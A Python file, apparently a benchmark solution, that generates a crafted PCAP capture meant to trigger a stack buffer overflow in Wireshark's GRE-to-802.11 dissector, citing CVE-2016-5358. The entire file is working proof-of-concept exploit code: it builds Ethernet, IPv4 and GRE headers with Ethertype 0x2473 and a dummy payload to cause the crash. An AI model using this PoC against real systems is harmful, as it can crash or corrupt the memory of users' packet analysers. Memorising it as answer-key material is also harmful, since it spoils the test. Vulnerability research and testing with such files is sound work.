import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in Wireshark's GRE/802.11 dissector.
        The vulnerability (related to CVE-2016-5358) occurs when the GRE dissector invokes 
        the 802.11 dissector (via registered Ethertype 0x2473) without providing the expected 
        802.11 pseudo-header, leading to type confusion and stack corruption.
        """
        
        # PCAP Global Header
        # Magic (0xa1b2c3d4), Major(2), Minor(4), Zone(0), SigFigs(0), SnapLen(65535), Network(1=Ethernet)
        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 0xffff, 1)
        
        # Construct the malicious packet
        # Layer 1: Ethernet Header (14 bytes)
        # Dst: 00:00:00:00:00:00, Src: 00:00:00:00:00:00, Type: 0x0800 (IPv4)
        eth_header = b'\x00' * 12 + struct.pack('>H', 0x0800)
        
        # Layer 3: GRE Header (4 bytes)
        # Flags/Ver: 0x0000, Protocol: 0x2473 (IEEE 802.11)
        # 0x2473 is the non-standard Ethertype used by Wireshark for 802.11 over GRE
        gre_header = struct.pack('>HH', 0x0000, 0x2473)
        
        # Layer 4: Payload (802.11 Data)
        # Provide a small dummy payload. The crash is due to pseudo-header mismatch 
        # reading/writing stack memory, not necessarily deep packet parsing.
        payload = b'\x00' * 16
        
        # Layer 2: IP Header (20 bytes)
        # Calculate total length
        ip_data = gre_header + payload
        ip_total_len = 20 + len(ip_data)
        
        # Helper for IP Checksum
        def checksum(data):
            if len(data) % 2 == 1:
                data += b'\0'
            s = 0
            for i in range(0, len(data), 2):
                w = (data[i] << 8) + data[i+1]
                s += w
            s = (s >> 16) + (s & 0xffff)
            s += (s >> 16)
            return (~s) & 0xffff

        # IP Header fields: 
        # VerHL(0x45), ToS(0), Len, ID(0x1337), Frag(0), TTL(64), Proto(47=GRE), Csum(0), Src, Dst
        # 47 is GRE protocol
        ip_header_tmpl = struct.pack('>BBHHHBBHII', 
            0x45, 0, ip_total_len, 0x1337, 0, 64, 47, 0, 0x7F000001, 0x7F000001)
            
        csum = checksum(ip_header_tmpl)
        ip_header = struct.pack('>BBHHHBBHII', 
            0x45, 0, ip_total_len, 0x1337, 0, 64, 47, csum, 0x7F000001, 0x7F000001)
            
        # Assemble Packet Data
        packet_data = eth_header + ip_header + ip_data
        
        # PCAP Packet Header
        # TsSec(0), TsUsec(0), InclLen, OrigLen
        packet_len = len(packet_data)
        pcap_packet_header = struct.pack('<IIII', 0, 0, packet_len, packet_len)
        
        return pcap_header + pcap_packet_header + packet_data
